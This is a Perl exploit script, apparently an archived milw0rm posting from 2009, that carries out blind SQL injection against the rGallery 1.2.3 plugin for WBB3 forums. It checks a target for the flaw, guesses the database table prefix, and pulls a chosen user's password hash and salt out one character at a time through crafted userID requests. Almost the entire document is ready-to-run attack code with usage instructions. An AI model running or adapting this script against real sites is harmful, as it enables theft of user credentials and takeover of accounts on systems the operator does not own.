<html><head><title>WBB3 rGallery 1.2.3 (UserGallery) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

use strict;
use LWP::Simple;

$| = 1;

print q {
#############################
## WBB3 Blind SQL-Injector ##
#### Exploit in rGallery ####
###### by Invisibility ######
#############################
\\\    Special greetz to     #
//  Katharsis/**/nobody     #
\\\    Gunner/**/Cheese      #
//          Thx ;)          #
#############################


};

if (@ARGV &lt; 3) {
 print &quot;Usage: wbb3sploit.pl [url] [user id] [User Gallery userID] \nExample: wbb3sploit.pl www.target.com 1 5\n&quot;;
 print &quot;[User Gallery UserID] has to be the ID of a User, who has got pictures.\nExample: www.target.com/index.php?page=RGalleryUserGallery&amp;userID=5\n&quot;;
 exit;
}

my $url = shift;
my $uid  = shift;
my $galid  = shift;

my $prefix;

my @charset = ('a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','0');

print &quot;~ Is it vulnerable?...\n&quot;;

my $chreq = get(&quot;http://&quot;.$url.&quot;/index.php?page=RGalleryUserGallery&amp;userID='&quot;);

if (($chreq =~ m/Fatal error/i) || ($chreq =~ m/Invalid SQL/i)) {

print &quot;Nice, seems to be vulnerable!\n&quot;;

} else {

print &quot;Seems to be patched, sorry\n&quot;;
exit;

}

print &quot;~ Checking Prefix...\n&quot;;

if ($chreq =~ m/_wcf/i) {

 print &quot;~ Found Prefix '$1'\n&quot;;
 $prefix = $1;

} else {
 print &quot;~ Can't find prefix, using 'wcf1_'\n&quot;;
 $prefix = &quot;wcf1_&quot;;
}

print &quot;~ Exploiting...\n&quot;;
print &quot;~^~ Hash: &quot;;

my $counter = 1;
my $countersalt = 1;

while($counter &lt; 41) {

foreach(@charset) {

 my $ascode       = ord($_);
 my $result       = get(&quot;http://&quot;.$url.&quot;/index.php?page=RGalleryUserGallery&amp;userID=&quot;.$galid.&quot;/**/AND/**/ascii(substring((SELECT/**/password/**/FROM/**/&quot;.$prefix.&quot;user/**/WHERE/**/userid=&quot;.$uid.&quot;),&quot;.$counter.&quot;))=&quot;.$ascode.&quot;&quot;);

 if (length($result) != 0) {
  if ($result =~ &quot;Keine&quot;) {
  }
  else{
   print chr($ascode);
   $counter++;
   }
  }
 }
}
my $saltcheck = get(&quot;http://&quot;.$url.&quot;/index.php?page=RGalleryUserGallery&amp;userID=&quot;.$galid.&quot;/**/AND/**/ascii(substring((SELECT/**/salt/**/FROM/**/&quot;.$prefix.&quot;user/**/WHERE/**/userid=&quot;.$uid.&quot;),1))&gt;0&quot;);
if($saltcheck =~ &quot;Keine&quot;)
{
}
else
{
print &quot;\n~^~ Salt: &quot;;
while($countersalt &lt; 41) {

foreach(@charset) {

 my $ascodesalt       = ord($_);
 my $resultsalt       = get(&quot;http://&quot;.$url.&quot;/index.php?page=RGalleryUserGallery&amp;userID=&quot;.$galid.&quot;/**/AND/**/ascii(substring((SELECT/**/salt/**/FROM/**/&quot;.$prefix.&quot;user/**/WHERE/**/userid=&quot;.$uid.&quot;),&quot;.$countersalt.&quot;))=&quot;.$ascodesalt.&quot;&quot;);

 if (length($resultsalt) != 0) {
  if ($resultsalt =~ &quot;Keine&quot;) {
  }
  else{
   print chr($ascodesalt);
   $countersalt++;
   }
  }
 }
}
}
print &quot;\n~ Done! Exploit by Invisibility\n&quot;;

# milw0rm.com [2009-03-23]</pre></html>